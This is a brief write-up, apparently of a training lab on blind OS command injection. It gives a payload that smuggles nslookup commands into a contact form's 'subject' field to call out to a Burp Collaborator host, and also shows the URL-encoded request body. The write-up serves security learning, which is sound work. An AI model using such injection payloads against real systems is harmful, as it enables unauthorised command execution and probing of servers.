# Lab: Blind OS command injection with out-of-band interaction
## Description

1. Used the Burp Scanner to find the injection point. Which instantly solved the Lab.

## Solution

Take the following payload:
```
test&nslookup -q=cname 59cgselw1fmquoaadu9gv9ue95fw3l.burpcollaborator.net.&'\"`0&nslookup -q=cname 59cgselw1fmquoaadu9gv9ue95fw3l.burpcollaborator.net.&`'
```
URL-encode it pass it to the vulnerable `subject` input parameter. Example:

```
csrf=xQdUYjONTTQAvF6WCvvRk1o3fpNXFmdf&name=test&email=test%40test.com&subject=test%26nslookup+-q%3dcname+59cgselw1fmquoaadu9gv9ue95fw3l.burpcollaborator.net.%26'\"`0%26nslookup+-q%3dcname+59cgselw1fmquoaadu9gv9ue95fw3l.burpcollaborator.net.%26`'&message=test
```
